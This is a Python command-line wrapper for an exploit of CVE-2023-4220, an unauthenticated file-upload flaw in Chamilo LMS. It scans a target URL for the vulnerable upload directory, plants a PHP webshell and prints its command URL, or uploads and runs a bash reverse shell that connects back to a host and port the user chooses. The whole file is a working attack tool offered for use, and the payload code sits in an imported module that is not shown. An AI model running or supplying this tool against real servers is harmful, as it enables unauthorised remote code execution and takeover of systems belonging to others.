from argparse import ArgumentParser
from exploit import ChamiloBigUploadExploit
from os import system


def check_extension(filename: str, extension: str) -> str:
    if not filename.endswith(f'.{extension}'):
        return f'{filename}.{extension}'

    return filename


def scan_action() -> None:
    system('clear')

    result = exploit.check_target_vulnerable()

    if result:
        print('[+] Target is likely vulnerable. Go ahead. [+]')
    else:
        print('[-] Target is not vulnerable [-]')
        print(f'\nCould not access {url}/main/inc/lib/javascript/bigupload/files/')


def webshell_action() -> None:
    system('clear')
    
    filename = input('Enter the name of the webshell file that will be placed on the target server (default: webshell.php): ')

    if not filename:
        filename = 'webshell.php'

    filename = check_extension(filename, 'php')

    result = exploit.send_webshell(filename)

    system('clear')

    if result:
        print('[+] Upload successfull [+]')
        print(f'\nWebshell URL: {result}?cmd=<command>')
    else:
        print('[-] Something went wrong [-]')
        print(f'\nUnable to determine whether the file upload was successful. You can check at {url}/main/inc/lib/javascript/bigupload/files/')


def revshell_action() -> None:
    system('clear')

    webshell_filename = input('Enter the name of the webshell file that will be placed on the target server (default: webshell.php): ')
    bash_revshell_filename = input('Enter the name of the bash revshell file that will be placed on the target server (default: revshell.sh): ')
    host = input('Enter the host the target server will connect to when the revshell is run: ')
    port = input('Enter the port on the host the target server will connect to when the revshell is run: ')

    if not host or not port:
        print('\n[-] You need to provied a valid host and port for the target server to connect to [-]')
        exit(1)
    
    try:
        int(port)
    except ValueError:
        print('\n[-] You need to provied a valid host and port for the target server to connect to [-]')
        exit(1)

    if not webshell_filename:
        webshell_filename = 'webshell.php'

    if not bash_revshell_filename:
        bash_revshell_filename = 'revshell.sh'

    webshell_filename = check_extension(webshell_filename, 'php')
    bash_revshell_filename = check_extension(bash_revshell_filename, 'sh')

    system('clear')

    print('[!] BE SURE TO BE LISTENING ON THE PORT THAT YOU DEFINED [!]\n')

    result = exploit.send_and_execute_revshell(webshell_filename, bash_revshell_filename, host, port)

    if result:
        print('[+] Execution completed [+]')
        print('\nYou should already have a revserse connection by now.')
    else:
        print('[-] Something went wrong [-]')


actions = {
    'scan': scan_action,
    'webshell': webshell_action,
    'revshell': revshell_action
}

parser = ArgumentParser(
    'Chamilo LMS Unauthenticated Big Upload File RCE',
    'This is a script written in Python that allows the exploitation of the Chamilo\'s LMS software security flaw described in CVE-2023-4220'
)

parser.add_argument('-u', '--url', type=str, required=True, help='Target Root Chamilo\'s URL')
parser.add_argument('-a', '--action', type=str, required=True, help='Action to perform on the vulnerable endpoint (webshell: Create PHP webshell file, revshell: Create and execute bash revshell file)')

args = parser.parse_args()

action = args.action
url = args.url.rstrip('/')

exploit = ChamiloBigUploadExploit(url)

actions[action]()